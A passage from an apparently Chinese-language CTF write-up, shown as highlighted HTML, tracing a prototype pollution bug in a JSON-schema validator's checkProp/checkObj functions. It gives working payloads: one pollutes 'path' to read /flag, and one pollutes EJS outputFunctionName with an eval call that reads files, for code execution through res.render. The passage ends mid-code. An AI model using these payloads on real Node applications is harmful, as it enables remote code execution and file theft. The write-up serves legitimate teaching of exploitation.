        <span class=k>if</span> <span class=p>(</span><span class=nx>schema</span><span class=p>.</span><span class=nx>minItems</span> <span class=o>&amp;&amp;</span> <span class=nx>value</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>minItems</span><span class=p>)</span> <span class=p>{</span>
          <span class=nx>addError</span><span class=p>(</span><span class=s2>&#34;There must be a minimum of &#34;</span> <span class=o>+</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>minItems</span> <span class=o>+</span> <span class=s2>&#34; in the array&#34;</span><span class=p>);</span>
        <span class=p>}</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>schema</span><span class=p>.</span><span class=nx>maxItems</span> <span class=o>&amp;&amp;</span> <span class=nx>value</span><span class=p>.</span><span class=nx>length</span> <span class=o>&gt;</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>maxItems</span><span class=p>)</span> <span class=p>{</span>
          <span class=nx>addError</span><span class=p>(</span><span class=s2>&#34;There must be a maximum of &#34;</span> <span class=o>+</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>maxItems</span> <span class=o>+</span> <span class=s2>&#34; in the array&#34;</span><span class=p>);</span>
        <span class=p>}</span>
      <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>schema</span><span class=p>.</span><span class=nx>properties</span> <span class=o>||</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>additionalProperties</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>errors</span><span class=p>.</span><span class=nx>concat</span><span class=p>(</span><span class=nx>checkObj</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>properties</span><span class=p>,</span> <span class=nx>path</span><span class=p>,</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>additionalProperties</span><span class=p>));</span>
      <span class=p>}</span>
      <span class=k>if</span> <span class=p>(</span><span class=nx>schema</span><span class=p>.</span><span class=nx>pattern</span> <span class=o>&amp;&amp;</span> <span class=k>typeof</span> <span class=nx>value</span> <span class=o>==</span> <span class=s1>&#39;string&#39;</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>value</span><span class=p>.</span><span class=nx>match</span><span class=p>(</span><span class=nx>schema</span><span class=p>.</span><span class=nx>pattern</span><span class=p>))</span> <span class=p>{</span>
        <span class=nx>addError</span><span class=p>(</span><span class=s2>&#34;does not match the regex pattern &#34;</span> <span class=o>+</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>pattern</span><span class=p>);</span>
      <span class=p>}</span>
      <span class=k>if</span> <span class=p>(</span><span class=nx>schema</span><span class=p>.</span><span class=nx>maxLength</span> <span class=o>&amp;&amp;</span> <span class=k>typeof</span> <span class=nx>value</span> <span class=o>==</span> <span class=s1>&#39;string&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>value</span><span class=p>.</span><span class=nx>length</span> <span class=o>&gt;</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>maxLength</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>addError</span><span class=p>(</span><span class=s2>&#34;may only be &#34;</span> <span class=o>+</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>maxLength</span> <span class=o>+</span> <span class=s2>&#34; characters long&#34;</span><span class=p>);</span>
      <span class=p>}</span>
      <span class=k>if</span> <span class=p>(</span><span class=nx>schema</span><span class=p>.</span><span class=nx>minLength</span> <span class=o>&amp;&amp;</span> <span class=k>typeof</span> <span class=nx>value</span> <span class=o>==</span> <span class=s1>&#39;string&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>value</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>minLength</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>addError</span><span class=p>(</span><span class=s2>&#34;must be at least &#34;</span> <span class=o>+</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>minLength</span> <span class=o>+</span> <span class=s2>&#34; characters long&#34;</span><span class=p>);</span>
      <span class=p>}</span>
      <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>minimum</span> <span class=o>!==</span> <span class=kc>undefined</span> <span class=o>&amp;&amp;</span> <span class=k>typeof</span> <span class=nx>value</span> <span class=o>==</span> <span class=k>typeof</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>minimum</span> <span class=o>&amp;&amp;</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>minimum</span> <span class=o>&gt;</span> <span class=nx>value</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>addError</span><span class=p>(</span><span class=s2>&#34;must have a minimum value of &#34;</span> <span class=o>+</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>minimum</span><span class=p>);</span>
      <span class=p>}</span>
      <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>maximum</span> <span class=o>!==</span> <span class=kc>undefined</span> <span class=o>&amp;&amp;</span> <span class=k>typeof</span> <span class=nx>value</span> <span class=o>==</span> <span class=k>typeof</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>maximum</span> <span class=o>&amp;&amp;</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>maximum</span> <span class=o>&lt;</span> <span class=nx>value</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>addError</span><span class=p>(</span><span class=s2>&#34;must have a maximum value of &#34;</span> <span class=o>+</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>maximum</span><span class=p>);</span>
      <span class=p>}</span>
      <span class=k>if</span> <span class=p>(</span><span class=nx>schema</span><span class=p>[</span><span class=s1>&#39;enum&#39;</span><span class=p>])</span> <span class=p>{</span>
        <span class=kd>var</span> <span class=nx>enumer</span> <span class=o>=</span> <span class=nx>schema</span><span class=p>[</span><span class=s1>&#39;enum&#39;</span><span class=p>];</span>
        <span class=nx>l</span> <span class=o>=</span> <span class=nx>enumer</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span>
        <span class=kd>var</span> <span class=nx>found</span><span class=p>;</span>
        <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>j</span> <span class=o>&lt;</span> <span class=nx>l</span><span class=p>;</span> <span class=nx>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
          <span class=k>if</span> <span class=p>(</span><span class=nx>enumer</span><span class=p>[</span><span class=nx>j</span><span class=p>]</span> <span class=o>===</span> <span class=nx>value</span><span class=p>)</span> <span class=p>{</span>
            <span class=nx>found</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
            <span class=k>break</span><span class=p>;</span>
          <span class=p>}</span>
        <span class=p>}</span>
        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>found</span><span class=p>)</span> <span class=p>{</span>
          <span class=nx>addError</span><span class=p>(</span><span class=s2>&#34;does not have a value in the enumeration &#34;</span> <span class=o>+</span> <span class=nx>enumer</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=s2>&#34;, &#34;</span><span class=p>));</span>
        <span class=p>}</span>
      <span class=p>}</span>
      <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>maxDecimal</span> <span class=o>==</span> <span class=s1>&#39;number&#39;</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nx>value</span><span class=p>.</span><span class=nx>toString</span><span class=p>().</span><span class=nx>match</span><span class=p>(</span><span class=k>new</span> <span class=nb>RegExp</span><span class=p>(</span><span class=s2>&#34;\\.[0-9]{&#34;</span> <span class=o>+</span> <span class=p>(</span><span class=nx>schema</span><span class=p>.</span><span class=nx>maxDecimal</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;,}&#34;</span><span class=p>))))</span> <span class=p>{</span>
        <span class=nx>addError</span><span class=p>(</span><span class=s2>&#34;may only have &#34;</span> <span class=o>+</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>maxDecimal</span> <span class=o>+</span> <span class=s2>&#34; digits of decimal places&#34;</span><span class=p>);</span>
      <span class=p>}</span>
    <span class=p>}</span>
  <span class=p>}</span>
  <span class=k>return</span> <span class=kc>null</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=c1>// validate an object against a schema
</span><span class=c1></span><span class=kd>function</span> <span class=nx>checkObj</span><span class=p>(</span><span class=nx>instance</span><span class=p>,</span> <span class=nx>objTypeDef</span><span class=p>,</span> <span class=nx>path</span><span class=p>,</span> <span class=nx>additionalProp</span><span class=p>)</span> <span class=p>{</span>

  <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>objTypeDef</span> <span class=o>==</span> <span class=s1>&#39;object&#39;</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>instance</span> <span class=o>!=</span> <span class=s1>&#39;object&#39;</span> <span class=o>||</span> <span class=nx>instance</span> <span class=k>instanceof</span> <span class=nb>Array</span><span class=p>)</span> <span class=p>{</span>
      <span class=nx>errors</span><span class=p>.</span><span class=nx>push</span><span class=p>({</span>
        <span class=nx>property</span><span class=o>:</span> <span class=nx>path</span><span class=p>,</span>
        <span class=nx>message</span><span class=o>:</span> <span class=s2>&#34;an object is required&#34;</span>
      <span class=p>});</span>
    <span class=p>}</span>

    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=k>in</span> <span class=nx>objTypeDef</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>if</span> <span class=p>(</span><span class=nx>objTypeDef</span><span class=p>.</span><span class=nx>hasOwnProperty</span><span class=p>(</span><span class=nx>i</span><span class=p>))</span> <span class=p>{</span>
        <span class=kd>var</span> <span class=nx>value</span> <span class=o>=</span> <span class=nx>instance</span><span class=p>[</span><span class=nx>i</span><span class=p>];</span>
        <span class=c1>// skip _not_ specified properties
</span><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=nx>value</span> <span class=o>===</span> <span class=kc>undefined</span> <span class=o>&amp;&amp;</span> <span class=nx>options</span><span class=p>.</span><span class=nx>existingOnly</span><span class=p>)</span> <span class=k>continue</span><span class=p>;</span>
        <span class=kd>var</span> <span class=nx>propDef</span> <span class=o>=</span> <span class=nx>objTypeDef</span><span class=p>[</span><span class=nx>i</span><span class=p>];</span>
        <span class=c1>// set default
</span><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=nx>value</span> <span class=o>===</span> <span class=kc>undefined</span> <span class=o>&amp;&amp;</span> <span class=nx>propDef</span><span class=p>[</span><span class=s2>&#34;default&#34;</span><span class=p>])</span> <span class=p>{</span>
          <span class=nx>value</span> <span class=o>=</span> <span class=nx>instance</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>=</span> <span class=nx>propDef</span><span class=p>[</span><span class=s2>&#34;default&#34;</span><span class=p>];</span>
        <span class=p>}</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>coerce</span> <span class=o>&amp;&amp;</span> <span class=nx>i</span> <span class=k>in</span> <span class=nx>instance</span><span class=p>)</span> <span class=p>{</span>
          <span class=nx>value</span> <span class=o>=</span> <span class=nx>instance</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>=</span> <span class=nx>options</span><span class=p>.</span><span class=nx>coerce</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span> <span class=nx>propDef</span><span class=p>);</span>
        <span class=p>}</span>
        <span class=nx>checkProp</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span> <span class=nx>propDef</span><span class=p>,</span> <span class=nx>path</span><span class=p>,</span> <span class=nx>i</span><span class=p>);</span>
      <span class=p>}</span>
    <span class=p>}</span>
  <span class=p>}</span>
  <span class=k>for</span> <span class=p>(</span><span class=nx>i</span> <span class=k>in</span> <span class=nx>instance</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>instance</span><span class=p>.</span><span class=nx>hasOwnProperty</span><span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=nx>i</span><span class=p>.</span><span class=nx>charAt</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>==</span> <span class=s1>&#39;_&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>i</span><span class=p>.</span><span class=nx>charAt</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=s1>&#39;_&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>objTypeDef</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>objTypeDef</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=nx>additionalProp</span> <span class=o>===</span> <span class=kc>false</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>if</span> <span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>filter</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>delete</span> <span class=nx>instance</span><span class=p>[</span><span class=nx>i</span><span class=p>];</span>
        <span class=k>continue</span><span class=p>;</span>
      <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=nx>errors</span><span class=p>.</span><span class=nx>push</span><span class=p>({</span>
          <span class=nx>property</span><span class=o>:</span> <span class=nx>path</span><span class=p>,</span>
          <span class=nx>message</span><span class=o>:</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>value</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;The property &#34;</span> <span class=o>+</span> <span class=nx>i</span> <span class=o>+</span> <span class=s2>&#34; is not defined in the schema and the schema does not allow additional properties&#34;</span>
        <span class=p>});</span>
      <span class=p>}</span>
    <span class=p>}</span>
    <span class=kd>var</span> <span class=nx>requires</span> <span class=o>=</span> <span class=nx>objTypeDef</span> <span class=o>&amp;&amp;</span> <span class=nx>objTypeDef</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=nx>objTypeDef</span><span class=p>[</span><span class=nx>i</span><span class=p>].</span><span class=nx>requires</span><span class=p>;</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>requires</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=nx>requires</span> <span class=k>in</span> <span class=nx>instance</span><span class=p>))</span> <span class=p>{</span>
      <span class=nx>errors</span><span class=p>.</span><span class=nx>push</span><span class=p>({</span>
        <span class=nx>property</span><span class=o>:</span> <span class=nx>path</span><span class=p>,</span>
        <span class=nx>message</span><span class=o>:</span> <span class=s2>&#34;the presence of the property &#34;</span> <span class=o>+</span> <span class=nx>i</span> <span class=o>+</span> <span class=s2>&#34; requires that &#34;</span> <span class=o>+</span> <span class=nx>requires</span> <span class=o>+</span> <span class=s2>&#34; also be present&#34;</span>
      <span class=p>});</span>
    <span class=p>}</span>
    <span class=nx>value</span> <span class=o>=</span> <span class=nx>instance</span><span class=p>[</span><span class=nx>i</span><span class=p>];</span>
    <span class=k>if</span> <span class=p>(</span><span class=nx>additionalProp</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=nx>objTypeDef</span> <span class=o>&amp;&amp;</span> <span class=k>typeof</span> <span class=nx>objTypeDef</span> <span class=o>==</span> <span class=s1>&#39;object&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=o>!</span><span class=p>(</span><span class=nx>i</span> <span class=k>in</span> <span class=nx>objTypeDef</span><span class=p>)))</span> <span class=p>{</span>
      <span class=k>if</span> <span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>coerce</span><span class=p>)</span> <span class=p>{</span>
        <span class=nx>value</span> <span class=o>=</span> <span class=nx>instance</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>=</span> <span class=nx>options</span><span class=p>.</span><span class=nx>coerce</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span> <span class=nx>additionalProp</span><span class=p>);</span>
      <span class=p>}</span>
      <span class=nx>checkProp</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span> <span class=nx>additionalProp</span><span class=p>,</span> <span class=nx>path</span><span class=p>,</span> <span class=nx>i</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>_changing</span> <span class=o>&amp;&amp;</span> <span class=nx>value</span> <span class=o>&amp;&amp;</span> <span class=nx>value</span><span class=p>.</span><span class=nx>$schema</span><span class=p>)</span> <span class=p>{</span>
      <span class=nx>errors</span> <span class=o>=</span> <span class=nx>errors</span><span class=p>.</span><span class=nx>concat</span><span class=p>(</span><span class=nx>checkProp</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span> <span class=nx>value</span><span class=p>.</span><span class=nx>$schema</span><span class=p>,</span> <span class=nx>path</span><span class=p>,</span> <span class=nx>i</span><span class=p>));</span>
    <span class=p>}</span>
  <span class=p>}</span>
  <span class=k>return</span> <span class=nx>errors</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div><p>首先第一次我们会进入到 <code>checkProp</code> 函数，传入以下参数，并进行循环</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>checkProp</span><span class=p>(</span><span class=nx>instance</span><span class=p>,</span><span class=nx>instance</span><span class=p>.</span><span class=nx>$schema</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>);</span>
<span class=c1>//instance = {&#34;$schema&#34;: {&#34;properties&#34;: {&#34;__proto__&#34;: {&#34;properties&#34;: {&#34;path&#34;: {&#34;default&#34;: &#34;/flag&#34;}}}}}}
</span><span class=c1>//instance.$schema = {&#34;properties&#34;: {&#34;__proto__&#34;: {&#34;properties&#34;: {&#34;path&#34;: {&#34;default&#34;: &#34;/flag&#34;}}}}}
</span></code></pre></div><p>接着在经过判断之后进入<code>checkObj</code>函数</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=k>if</span><span class=p>(</span><span class=nx>schema</span><span class=p>.</span><span class=nx>properties</span> <span class=o>||</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>additionalProperties</span><span class=p>){</span>
	<span class=nx>errors</span><span class=p>.</span><span class=nx>concat</span><span class=p>(</span><span class=nx>checkObj</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>properties</span><span class=p>,</span> <span class=nx>path</span><span class=p>,</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>additionalProperties</span><span class=p>));</span>
<span class=p>}</span>
<span class=c1>//value = {&#34;$schema&#34;: {&#34;properties&#34;: {&#34;__proto__&#34;: {&#34;properties&#34;: {&#34;path&#34;: {&#34;default&#34;: &#34;/flag&#34;}}}}}}
</span><span class=c1>//schema.properties = {&#34;__proto__&#34;: {&#34;properties&#34;: {&#34;path&#34;: {&#34;default&#34;: &#34;/flag&#34;}}}}
</span></code></pre></div><p>在函数循环中，再次进入到<code>checkProp</code>函数</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=k>for</span><span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=k>in</span> <span class=nx>objTypeDef</span><span class=p>){</span> 
  <span class=k>if</span><span class=p>(</span><span class=nx>objTypeDef</span><span class=p>.</span><span class=nx>hasOwnProperty</span><span class=p>(</span><span class=nx>i</span><span class=p>)){</span>
    <span class=kd>var</span> <span class=nx>value</span> <span class=o>=</span> <span class=nx>instance</span><span class=p>[</span><span class=nx>i</span><span class=p>];</span>
    <span class=c1>// skip _not_ specified properties
</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nx>value</span> <span class=o>===</span> <span class=kc>undefined</span> <span class=o>&amp;&amp;</span> <span class=nx>options</span><span class=p>.</span><span class=nx>existingOnly</span><span class=p>)</span> <span class=k>continue</span><span class=p>;</span>
    <span class=kd>var</span> <span class=nx>propDef</span> <span class=o>=</span> <span class=nx>objTypeDef</span><span class=p>[</span><span class=nx>i</span><span class=p>];</span>
    <span class=c1>// set default
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=nx>value</span> <span class=o>===</span> <span class=kc>undefined</span> <span class=o>&amp;&amp;</span> <span class=nx>propDef</span><span class=p>[</span><span class=s2>&#34;default&#34;</span><span class=p>]){</span>
      <span class=nx>value</span> <span class=o>=</span> <span class=nx>instance</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>=</span> <span class=nx>propDef</span><span class=p>[</span><span class=s2>&#34;default&#34;</span><span class=p>];</span>
    <span class=p>}</span>
    <span class=k>if</span><span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>coerce</span> <span class=o>&amp;&amp;</span> <span class=nx>i</span> <span class=k>in</span> <span class=nx>instance</span><span class=p>){</span>
      <span class=nx>value</span> <span class=o>=</span> <span class=nx>instance</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>=</span> <span class=nx>options</span><span class=p>.</span><span class=nx>coerce</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span> <span class=nx>propDef</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=nx>checkProp</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span><span class=nx>propDef</span><span class=p>,</span><span class=nx>path</span><span class=p>,</span><span class=nx>i</span><span class=p>);</span>
    <span class=c1>//i = __proto__
</span><span class=c1></span>    <span class=c1>//value = prototype
</span><span class=c1></span>    <span class=c1>//propDDef = {&#34;properties&#34;: {&#34;path&#34;: {&#34;default&#34;: &#34;/flag&#34;}}}
</span><span class=c1></span>  <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>再次由判断进入到<code>checkObj</code>函数，传入以下参数，这时候注意<code>value</code>参数已经被指向<code>Function.prototype</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=k>if</span><span class=p>(</span><span class=nx>schema</span><span class=p>.</span><span class=nx>properties</span> <span class=o>||</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>additionalProperties</span><span class=p>){</span>
	<span class=nx>errors</span><span class=p>.</span><span class=nx>concat</span><span class=p>(</span><span class=nx>checkObj</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>properties</span><span class=p>,</span> <span class=nx>path</span><span class=p>,</span> <span class=nx>schema</span><span class=p>.</span><span class=nx>additionalProperties</span><span class=p>));</span>
<span class=p>}</span>
<span class=c1>//value = prototype
</span><span class=c1>//schema.properties = {&#34;path&#34;: {&#34;default&#34;: &#34;/flag&#34;}}
</span><span class=c1>//path = &#34;__proto__&#34;
</span></code></pre></div><p>所以当再次在这里进行赋值的时候，<code>instance</code>此时指向<code>Function.prototype</code>，参数 i 为 <code>path</code>，即被 <code>propDef['default']</code> 修改成了<code>/flag</code>，至此完成了原型链污染</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=c1>//instance = prototype
</span><span class=c1>//objTypeDef = {&#34;path&#34;: {&#34;default&#34;: &#34;/flag&#34;}}
</span><span class=c1></span><span class=k>for</span><span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=k>in</span> <span class=nx>objTypeDef</span><span class=p>){</span> 
  <span class=k>if</span><span class=p>(</span><span class=nx>objTypeDef</span><span class=p>.</span><span class=nx>hasOwnProperty</span><span class=p>(</span><span class=nx>i</span><span class=p>)){</span>
    <span class=kd>var</span> <span class=nx>value</span> <span class=o>=</span> <span class=nx>instance</span><span class=p>[</span><span class=nx>i</span><span class=p>];</span>
    <span class=c1>// skip _not_ specified properties
</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nx>value</span> <span class=o>===</span> <span class=kc>undefined</span> <span class=o>&amp;&amp;</span> <span class=nx>options</span><span class=p>.</span><span class=nx>existingOnly</span><span class=p>)</span> <span class=k>continue</span><span class=p>;</span>
    <span class=kd>var</span> <span class=nx>propDef</span> <span class=o>=</span> <span class=nx>objTypeDef</span><span class=p>[</span><span class=nx>i</span><span class=p>];</span>
    <span class=c1>// set default
</span><span class=c1></span>    <span class=c1>//i = path
</span><span class=c1></span>    <span class=c1>//value = undefined
</span><span class=c1></span>    <span class=c1>//propDef = {&#34;default&#34;: &#34;/flag&#34;}
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=nx>value</span> <span class=o>===</span> <span class=kc>undefined</span> <span class=o>&amp;&amp;</span> <span class=nx>propDef</span><span class=p>[</span><span class=s2>&#34;default&#34;</span><span class=p>]){</span>
    	<span class=nx>value</span> <span class=o>=</span> <span class=nx>instance</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>=</span> <span class=nx>propDef</span><span class=p>[</span><span class=s2>&#34;default&#34;</span><span class=p>];</span>
    <span class=p>}</span>
    <span class=k>if</span><span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>coerce</span> <span class=o>&amp;&amp;</span> <span class=nx>i</span> <span class=k>in</span> <span class=nx>instance</span><span class=p>){</span>
    	<span class=nx>value</span> <span class=o>=</span> <span class=nx>instance</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>=</span> <span class=nx>options</span><span class=p>.</span><span class=nx>coerce</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span> <span class=nx>propDef</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=nx>checkProp</span><span class=p>(</span><span class=nx>value</span><span class=p>,</span><span class=nx>propDef</span><span class=p>,</span><span class=nx>path</span><span class=p>,</span><span class=nx>i</span><span class=p>);</span>
		<span class=c1>//value = &#34;/flag&#34;
</span><span class=c1></span>    <span class=c1>//propDef = {&#34;default&#34;: &#34;/flag&#34;}
</span><span class=c1></span>    <span class=c1>//path = &#34;__proto__&#34;
</span><span class=c1></span>    <span class=c1>//i = &#34;path&#34;
</span><span class=c1></span>  <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>整个过程这里写的比较简单，不过只要简单 debug 就可以弄明白整个流程，并不算很难。污染了 <code>path</code> 之后，就可以跟前面的一样，直接通过<code>fs.readFileSync(p.path).toString()</code>来拿 flag 了。</p>
<p>当然还可以污染 express ejs</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=p>{</span><span class=nt>&#34;$schema&#34;</span><span class=p>:{</span><span class=nt>&#34;type&#34;</span><span class=p>:</span><span class=s2>&#34;object&#34;</span><span class=p>,</span><span class=nt>&#34;properties&#34;</span><span class=p>:{</span><span class=nt>&#34;__proto__&#34;</span><span class=p>:{</span><span class=nt>&#34;type&#34;</span><span class=p>:</span><span class=s2>&#34;object&#34;</span><span class=p>,</span><span class=nt>&#34;properties&#34;</span><span class=p>:{</span><span class=nt>&#34;outputFunctionName&#34;</span><span class=p>:{</span><span class=nt>&#34;type&#34;</span><span class=p>:</span><span class=s2>&#34;string&#34;</span><span class=p>,</span><span class=nt>&#34;default&#34;</span><span class=p>:</span><span class=s2>&#34;x;return eval(\&#34;process.mainModule.require(&#39;fs&#39;).readFileSync(&#39;/fl&#39;+&#39;ag&#39;).toString(&#39;base64&#39;)\&#34;);//x&#34;</span><span class=p>},</span><span class=nt>&#34;path&#34;</span><span class=p>:{</span><span class=nt>&#34;type&#34;</span><span class=p>:</span><span class=s2>&#34;string&#34;</span><span class=p>,</span><span class=nt>&#34;default&#34;</span><span class=p>:</span><span class=s2>&#34;/foo&#34;</span><span class=p>}}}}}}</span>
</code></pre></div><p>因为如果要污染 ejs 的话需要用到<code>res.render</code>，而在 app.js 中我们可以看到有一个错误处理的地方使用到了<code>res.render</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>app</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s2>&#34;view engine&#34;</span><span class=p>,</span> <span class=s2>&#34;ejs&#34;</span><span class=p>);</span>
<span class=c1>//...
</span><span class=c1>// error handler
</span><span class=c1></span><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=kd>function</span><span class=p>(</span><span class=nx>err</span><span class=p>,</span> <span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>{</span>
  <span class=c1>// set locals, only providing error in development
</span><span class=c1></span>  <span class=nx>res</span><span class=p>.</span><span class=nx>locals</span><span class=p>.</span><span class=nx>message</span> <span class=o>=</span> <span class=nx>err</span><span class=p>.</span><span class=nx>message</span><span class=p>;</span>
  <span class=nx>res</span><span class=p>.</span><span class=nx>locals</span><span class=p>.</span><span class=nx>error</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;env&#34;</span><span class=p>)</span> <span class=o>===</span> <span class=s2>&#34;development&#34;</span> <span class=o>?</span> <span class=nx>err</span><span class=o>:</span> <span class=p>{};</span>

  <span class=c1>// render the error page
</span><span class=c1></span>  <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=nx>err</span><span class=p>.</span><span class=nx>status</span> <span class=o>||</span> <span class=mi>500</span><span class=p>);</span>
